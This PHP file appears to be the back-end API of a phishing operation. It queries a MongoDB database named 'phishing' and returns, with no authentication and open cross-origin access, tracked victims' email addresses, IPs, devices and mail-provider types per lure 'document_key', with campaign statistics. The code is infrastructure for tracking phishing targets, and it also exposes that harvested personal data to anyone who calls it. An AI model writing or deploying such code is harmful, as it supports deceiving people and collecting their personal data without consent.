<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

try {
    // Get MongoDB connection
    $mongo = getMongoClient();
    $db = $mongo->phishing;
    $visits = $db->visits;

    // Get query parameters
    $key = $_GET['key'] ?? null;
    $limit = isset($_GET['limit']) ? intval($_GET['limit']) : 100;

    // If specific key requested
    if ($key) {
        $filter = ['document_key' => $key];
        $cursor = $visits->find(
            $filter,
            [
                'sort' => ['timestamp' => -1],
                'limit' => $limit
            ]
        );

        $keyVisits = [];
        $uniqueEmails = [];
        
        foreach ($cursor as $doc) {
            $visit = [
                'ip' => $doc['ip'],
                'email' => $doc['email'],
                'device' => $doc['device'],
                'mx_type' => $doc['mx_type'],
                'document_key' => $doc['document_key'],
                'timestamp' => $doc['timestamp']->toDateTime()->format('c')
            ];
            $keyVisits[] = $visit;
            $uniqueEmails[$doc['email']] = true;
        }

        $totalCount = $visits->countDocuments($filter);

        echo json_encode([
            'success' => true,
            'document_key' => $key,
            'total_visits' => $totalCount,
            'unique_visitors' => count($uniqueEmails),
            'visits' => $keyVisits
        ]);
        exit;
    }

    // Get all visits grouped by key
    $pipeline = [
        [
            '$group' => [
                '_id' => '$document_key',
                'total_visits' => ['$sum' => 1],
                'unique_emails' => ['$addToSet' => '$email'],
                'visits' => ['$push' => '$$ROOT']
            ]
        ]
    ];

    $cursor = $visits->aggregate($pipeline);
    
    $visitsByKey = [];
    $totalVisits = 0;
    $deviceBreakdown = [];
    $mxTypeBreakdown = [];
    $allUniqueEmails = [];

    foreach ($cursor as $doc) {
        $docKey = $doc['_id'];
        $docVisits = array_slice($doc['visits'], -100); // Last 100 per key
        
        $formattedVisits = [];
        foreach ($docVisits as $visit) {
            $formattedVisits[] = [
                'ip' => $visit['ip'],
                'email' => $visit['email'],
                'device' => $visit['device'],
                'mx_type' => $visit['mx_type'],
                'document_key' => $visit['document_key'],
                'timestamp' => $visit['timestamp']->toDateTime()->format('c')
            ];
            
            // Build stats
            $deviceBreakdown[$visit['device']] = ($deviceBreakdown[$visit['device']] ?? 0) + 1;
            $mxTypeBreakdown[$visit['mx_type']] = ($mxTypeBreakdown[$visit['mx_type']] ?? 0) + 1;
            $allUniqueEmails[$visit['email']] = true;
        }

        $visitsByKey[$docKey] = [
            'total_visits' => $doc['total_visits'],
            'unique_visitors' => count($doc['unique_emails']),
            'visits' => array_reverse($formattedVisits) // Most recent first
        ];
        
        $totalVisits += $doc['total_visits'];
    }

    echo json_encode([
        'success' => true,
        'total_visits' => $totalVisits,
        'total_keys' => count($visitsByKey),
        'device_breakdown' => $deviceBreakdown,
        'mx_type_breakdown' => $mxTypeBreakdown,
        'visits_by_key' => $visitsByKey
    ]);

} catch (Exception $e) {
    error_log('Error fetching visits: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed to fetch visits',
        'details' => $e->getMessage()
    ]);
}

// ========== HELPER FUNCTION ==========

function getMongoClient() {
    $mongoUri = getenv('MONGODB_URI');
    
    if (!$mongoUri) {
        throw new Exception('MONGODB_URI not configured');
    }

    return new MongoDB\Client($mongoUri);
}
?>
